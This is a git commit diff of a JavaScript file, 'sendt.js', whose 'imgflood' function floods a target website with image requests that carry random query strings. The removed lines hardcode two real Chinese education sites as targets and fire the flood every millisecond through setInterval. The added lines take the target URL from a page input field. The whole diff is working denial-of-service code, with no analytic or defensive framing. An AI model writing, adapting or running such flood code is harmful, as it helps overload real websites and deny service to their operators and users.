68976d14c2636d1e90396ccf0ba9e5e1818dd651
Oc-found <153354935+OcFounder@users.noreply.github.com>
2024-07-05 11:47:57 +0800

    0

--- sendt.js
+++ sendt.js
@@ -1,18 +1,11 @@
 function imgflood() {
   try {
     var TARGET = document.getElementById('sss').value;
-  }catch {
     var pic = new Image();
     var ran = Math.floor(Math.random() * 1000);
-    //pic.src = TARGET+'?val='+ran;
-  }finally {
-    var pic = new Image();
-    var ran = Math.floor(Math.random() * 1000);
-    pic.src = 'https://www.yunxiao.com?val='+ran;
-    pic.src = 'https://yue.haofenshu.com?val='+ran;
-  }
+    pic.src = TARGET+'?val='+ran;
+  }catch {}
 }
-  setInterval(imgflood, 1);
 
 function aaa(){
   if (document.getElementById('sss').value.search( /^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/) != -1){
